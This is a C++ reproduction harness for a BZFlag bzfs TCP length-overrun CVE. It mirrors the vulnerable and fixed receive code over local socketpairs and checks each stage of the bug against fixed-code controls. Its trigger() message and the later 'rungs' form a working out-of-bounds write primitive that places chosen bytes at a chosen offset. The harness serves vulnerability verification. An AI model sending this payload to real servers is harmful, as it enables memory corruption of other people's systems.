/*
 * Extracted, source-bound harness for CVE-2026-130849 (BZFlag bzfs
 * NetHandler::tcpReceive TCP length overrun).  Read-only provisioning from
 * upstream v2.4.30 (vulnerable) / v2.4.32 (fixed); see PROVENANCE.md.
 *
 * All sockets are AF_UNIX socketpairs created in this process.  No network
 * traffic leaves the loopback process; no external system is contacted.
 *
 * Upstream lines mirrored (v2.4.30 src/game/NetHandler.cxx):
 *   571-623 tcpReceive(): receive(4), check len > MaxPacketLen (line 587),
 *                        receive(4+len) (line 594), tcplen = 0 (line 602).
 *   625-669 receive():    recv(fd, tcpmsg + tcplen, length - tcplen) (line 636),
 *                        tcplen += size (line 639).
 *   include/NetHandler.h: char tcpmsg[MaxPacketLen]; int tcplen;
 *   include/Protocol.h:53: const int MaxPacketLen = 1024;
 *
 *
 * Fix 8e501d6 changes line 587 to `len > MaxPacketLen - 4` and adds to
 * receive(): `if ((tcplen < 0) || ((size_t)tcplen > sizeof(tcpmsg)) ||
 * (length > sizeof(tcpmsg))) return returnValue;`.
 */

#include <arpa/inet.h>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <sys/socket.h>
#include <unistd.h>
#include <cerrno>


static const int MaxPacketLen = 1024; /* Protocol.h:53 */

enum RxStatus { ReadAll, ReadPart, ReadHuge, ReadReset, ReadError, ReadDiscon };

/*
 * Mirror the member order *around* tcpmsg from NetHandler.h (v2.4.30):
 *   AresHandler* ares; PlayerInfo* info; sockaddr_in uaddr;
 *   int playerIndex; int fd; Address peer; std::string dotNotation;
 *   char tcpmsg[MaxPacketLen]; int tcplen; bool closed;
 * The first five members keep their stock widths.  peer/dotNotation are
 * represented by padding of 48 bytes so the prefix is deterministic for this
 * build while the adjacency tcpmsg -> tcplen stays exact.  Keeping the prefix
 * smaller than 1024 makes the -1024-class destination land before the heap
 * object (ASan-visible) rather than inside an opaque std::string.
 */
struct NetHandlerLike {
    void *ares;                        /* offset 0  */
    void *info;                        /* offset 8  */
    uint8_t uaddr[16];                 /* offset 16 */
    int playerIndex;                   /* offset 32 */
    int fd;                            /* offset 36 */
    uint8_t prefix_pad[48];            /* offset 40 (peer + dotNotation stand-in) */
    char tcpmsg[MaxPacketLen];         /* offset 88 */
    int tcplen;                        /* offset 1112 */
    bool closed;                       /* offset 1116 */
};

static_assert(offsetof(NetHandlerLike, tcpmsg) == 88, "harness layout drift");
static_assert(offsetof(NetHandlerLike, tcplen) ==
              offsetof(NetHandlerLike, tcpmsg) + MaxPacketLen,
              "tcplen must directly follow tcpmsg as in NetHandler.h");
/* Chosen overwrite values are derived from the harness layout, not hardcoded:
 * after the overflow, tcplen = overwrite + 1024 and the next recv writes at
 * tcpmsg + tcplen.  rung3 targets 16B before the object (ASan redzone);
 * rung4 targets the first member at object offset 0. */
static const int32_t X_RUNG3 = -(static_cast<int32_t>(offsetof(NetHandlerLike, tcpmsg)) + 16) - MaxPacketLen;
static const int32_t X_RUNG4 = -static_cast<int32_t>(offsetof(NetHandlerLike, tcpmsg)) - MaxPacketLen;

struct RecvCall {
    void *dst;
    size_t len;
    int got;
    uint8_t tail[4];
};
static RecvCall g_trace[8];
static int g_ntrace = 0;

static ssize_t traced_recv(int fd, void *buf, size_t len, int flags)
{
    ssize_t n = ::recv(fd, buf, len, flags);
    if (g_ntrace < 8) {
        RecvCall &c = g_trace[g_ntrace++];
        c.dst = buf;
        c.len = len;
        c.got = static_cast<int>(n);
        std::memset(c.tail, 0, sizeof(c.tail));
        if (n >= 4)
            std::memcpy(c.tail, static_cast<const uint8_t *>(buf) + n - 4, 4);
    }
    return n;
}

static RxStatus receive_msg(NetHandlerLike *h, size_t length, bool fixed)
{
    RxStatus rv = ReadError;
    if (h->closed) return rv;

    /* Fix hunk 2: reject an out-of-range read offset/destination. */
    if (fixed && (h->tcplen < 0 ||
                  static_cast<size_t>(h->tcplen) > sizeof(h->tcpmsg) ||
                  length > sizeof(h->tcpmsg)))
        return rv;

    if (static_cast<int>(length) <= h->tcplen) return ReadAll;
    int size = static_cast<int>(traced_recv(h->fd, h->tcpmsg + h->tcplen,
                                            static_cast<int>(length) - h->tcplen, 0));
    if (size > 0) {
        h->tcplen += size;
        rv = (h->tcplen == static_cast<int>(length)) ? ReadAll : ReadPart;
    } else if (size < 0) {
        const int err = errno;
        rv = (err == EAGAIN || err == EINTR) ? ReadPart : ReadError;
    } else {
        rv = ReadDiscon;
    }
    return rv;
}

static RxStatus tcp_receive(NetHandlerLike *h, bool fixed)
{
    RxStatus e = receive_msg(h, 4, fixed);
    if (e != ReadAll) return e;

    uint16_t len, code;
    const uint8_t *p = reinterpret_cast<const uint8_t *>(h->tcpmsg);
    len = static_cast<uint16_t>((p[0] << 8) | p[1]);
    code = static_cast<uint16_t>((p[2] << 8) | p[3]);

    /* v2.4.30 line 587: len > MaxPacketLen. Fix: MaxPacketLen - 4. */
    const int bound = fixed ? MaxPacketLen - 4 : MaxPacketLen;
    if (len > bound) return ReadHuge;

    e = receive_msg(h, 4 + static_cast<int>(len), fixed);
    if (e != ReadAll) return e;
    h->tcplen = 0;
    (void)code;
    return ReadAll;
}

static NetHandlerLike *make_handler(int &peerfd)
{
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
        std::perror("socketpair");
        std::exit(2);
    }
    NetHandlerLike *h = new NetHandlerLike();
    std::memset(h, 0, sizeof(*h));
    h->fd = sv[0];
    peerfd = sv[1];
    return h;
}

static void write_all(int fd, const void *data, size_t len)
{
    const uint8_t *p = static_cast<const uint8_t *>(data);
    while (len > 0) {
        ssize_t n = ::write(fd, p, len);
        if (n <= 0) {
            std::perror("write");
            std::exit(2);
        }
        p += n;
        len -= static_cast<size_t>(n);
    }
}

static void put32le(uint8_t *p, int32_t v)
{
    uint32_t u = static_cast<uint32_t>(v);
    for (int i = 0; i < 4; ++i) p[i] = static_cast<uint8_t>(u >> (8 * i));
}

static void put64le(uint8_t *p, uint64_t v)
{
    for (int i = 0; i < 8; ++i) p[i] = static_cast<uint8_t>(v >> (8 * i));
}

static int failures = 0;
static void check(bool ok, const char *what)
{
    std::printf("%s %s\n", ok ? "PASS" : "FAIL", what);
    if (!ok) ++failures;
}

/* Send a 4-byte header with len=1024 and a 1024-byte body whose last four
 * bytes are @overwrite (native little-endian int). */
static RxStatus trigger(NetHandlerLike *h, int peerfd, int32_t overwrite, bool fixed)
{
    uint8_t wire[4 + MaxPacketLen];
    std::memset(wire, 0x41, sizeof(wire));
    wire[0] = 0x04; wire[1] = 0x00;          /* len = 1024 (network order) */
    wire[2] = 0x12; wire[3] = 0x34;          /* code */
    put32le(wire + sizeof(wire) - 4, overwrite);
    write_all(peerfd, wire, sizeof(wire));
    g_ntrace = 0;
    return tcp_receive(h, fixed);
}

static void mode_rung1()
{
    int peer;
    NetHandlerLike *h = make_handler(peer);
    const int32_t overwrite = -2048;
    RxStatus st = trigger(h, peer, overwrite, false);

    std::printf("R1 status=%d tcplen=%d\n", static_cast<int>(st), h->tcplen);
    check(st == ReadPart, "rung1 oversized len accepted and body read as partial");
    check(g_ntrace == 2, "rung1 exactly two recv calls");
    check(g_trace[1].dst == h->tcpmsg + 4, "rung1 body recv destination is tcpmsg+4");
    check(g_trace[1].len == 1024, "rung1 body recv asks for 1024 bytes");
    check(g_trace[1].got == 1024, "rung1 body recv returned all 1024 bytes");
    check(std::memcmp(g_trace[1].tail, &overwrite, 4) == 0,
          "rung1 last four body bytes are the chosen overwrite value");
    check(h->tcplen == overwrite + 1024,
          "rung1 chosen value survives tcplen += size as a negative read offset");

    /* Fixed control in the same process. */
    int fpeer;
    NetHandlerLike *f = make_handler(fpeer);
    RxStatus fst = trigger(f, fpeer, overwrite, true);
    std::printf("R1FIXED status=%d tcplen=%d recv_calls=%d\n",
                static_cast<int>(fst), f->tcplen, g_ntrace);
    check(fst == ReadHuge, "rung1 fixed rejects len=1024 before the body read");
    check(g_ntrace == 1, "rung1 fixed made no body recv call");
    check(f->tcplen == 4, "rung1 fixed leaves a valid header-only tcplen");
}

static void mode_rung2()
{
    int peer;
    NetHandlerLike *h = make_handler(peer);
    const int32_t overwrite = -2048;
    (void)trigger(h, peer, overwrite, false);

    char *dst = h->tcpmsg + h->tcplen;
    long from_object = dst - reinterpret_cast<char *>(h);
    size_t next_len = static_cast<size_t>(4 - h->tcplen);
    std::printf("R2 tcplen=%d dst_from_object=%ld next_recv_len=%zu\n",
                h->tcplen, from_object, next_len);
    check(h->tcplen < 0, "rung2 read offset invariant 0<=tcplen<=sizeof(tcpmsg) broken");
    check(from_object < 0, "rung2 next recv destination is before the NetHandler object");
    check(next_len > 4, "rung2 next recv length inflated by the negative offset");

    /* Fixed hunk 2 rejects a corrupted offset before any recv. */
    int fpeer;
    NetHandlerLike *f = make_handler(fpeer);
    f->tcplen = -40;
    g_ntrace = 0;
    RxStatus a = receive_msg(f, 4, true);
    f->tcplen = static_cast<int>(sizeof(f->tcpmsg)) + 1;
    RxStatus b = receive_msg(f, 4, true);
    f->tcplen = 0;
    RxStatus c = receive_msg(f, sizeof(f->tcpmsg) + 1, true);
    std::printf("R2FIXED neg=%d over=%d longlen=%d recv_calls=%d\n",
                static_cast<int>(a), static_cast<int>(b), static_cast<int>(c), g_ntrace);
    check(a == ReadError && b == ReadError && c == ReadError,
          "rung2 fixed rejects negative, over-max and oversized-length cases");
    check(g_ntrace == 0, "rung2 fixed performed no recv on rejected inputs");
}

/* ASan mode: X=-1080 -> tcplen=-56 -> second recv destination is 16 bytes
 * before the heap object, inside ASan's left redzone. */
static void mode_rung3(bool fixed)
{
    int peer;
    NetHandlerLike *h = make_handler(peer);
    const int32_t overwrite = fixed ? -2048 : X_RUNG3;
    RxStatus st = trigger(h, peer, overwrite, fixed);
    std::printf("R3 fixed=%d first_status=%d tcplen=%d\n",
                static_cast<int>(fixed), static_cast<int>(st), h->tcplen);
    if (fixed) {
        check(st == ReadHuge, "rung3 fixed control rejects the oversized length");
        return;
    }
    check(st == ReadPart, "rung3 vulnerable first message left a partial read");
    check(h->tcplen == -(static_cast<int32_t>(offsetof(NetHandlerLike, tcpmsg)) + 16),
          "rung3 negative offset places the next write 16B before object");

    uint8_t payload[64];
    std::memset(payload, 0x5A, sizeof(payload));
    write_all(peer, payload, sizeof(payload));
    g_ntrace = 0;
    /* The real recv() writes 64 bytes at tcpmsg-56 == object-16. */
    RxStatus s2 = receive_msg(h, 4, false);
    std::printf("R3 second_status=%d recv_calls=%d\n", static_cast<int>(s2), g_ntrace);
    check(false, "rung3 non-ASan build must not be used for the OOB write mode");
}

/* Chosen bytes at a chosen member offset. X=-1064 -> tcplen=-40 -> second
 * recv destination is exactly the start of the object (the `ares` member). */
static void mode_rung4(bool fixed)
{
    int peer;
    NetHandlerLike *h = make_handler(peer);
    const int32_t overwrite = fixed ? -2048 : X_RUNG4;
    RxStatus st = trigger(h, peer, overwrite, fixed);
    std::printf("R4 fixed=%d first_status=%d tcplen=%d\n",
                static_cast<int>(fixed), static_cast<int>(st), h->tcplen);
    if (fixed) {
        check(st == ReadHuge, "rung4 fixed control rejects the oversized length");
        check(reinterpret_cast<uintptr_t>(h->ares) == 0,
              "rung4 fixed control leaves the preceding member untouched");
        return;
    }
    check(st == ReadPart, "rung4 vulnerable first message left a partial read");
    check(h->tcplen == -static_cast<int32_t>(offsetof(NetHandlerLike, tcpmsg)),
          "rung4 negative offset targets the object's first member");

    uint8_t payload[44];
    std::memset(payload, 0x5A, sizeof(payload));
    const uint64_t marker1 = 0xDEADBEEFCAFEBABEULL;
    const uint64_t marker2 = 0x0123456789ABCDEFULL;
    put64le(payload, marker1);
    put64le(payload + 8, marker2);
    write_all(peer, payload, sizeof(payload));
    g_ntrace = 0;
    RxStatus s2 = receive_msg(h, 4, false);
    std::printf("R4 second_status=%d recv_calls=%d dst_from_object=%ld\n",
                static_cast<int>(s2), g_ntrace,
                static_cast<char *>(g_trace[0].dst) - reinterpret_cast<char *>(h));
    check(g_ntrace == 1, "rung4 second recv happened exactly once");
    check(static_cast<char *>(g_trace[0].dst) == reinterpret_cast<char *>(h),
          "rung4 second recv destination is the chosen preceding member offset");
    check(reinterpret_cast<uint64_t>(h->ares) == marker1,
          "rung4 chosen marker1 read back byte-exact from the ares member");
    check(reinterpret_cast<uint64_t>(h->info) == marker2,
          "rung4 chosen marker2 read back byte-exact from the info member");
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "all";
    std::setvbuf(stdout, nullptr, _IONBF, 0);
    if (std::strcmp(mode, "rung1") == 0) mode_rung1();
    else if (std::strcmp(mode, "rung2") == 0) mode_rung2();
    else if (std::strcmp(mode, "rung3") == 0) mode_rung3(false);
    else if (std::strcmp(mode, "fixed-rung3") == 0) mode_rung3(true);
    else if (std::strcmp(mode, "rung4") == 0) mode_rung4(false);
    else if (std::strcmp(mode, "fixed-rung4") == 0) mode_rung4(true);
    else if (std::strcmp(mode, "all") == 0) {
        mode_rung1();
        mode_rung2();
        mode_rung4(false);
        mode_rung4(true);
    } else {
        std::fprintf(stderr, "unknown mode: %s\n", mode);
        return 2;
    }
    std::printf("FAILURES=%d rc=%d\n", failures, failures ? 1 : 0);
    return failures ? 1 : 0;
}
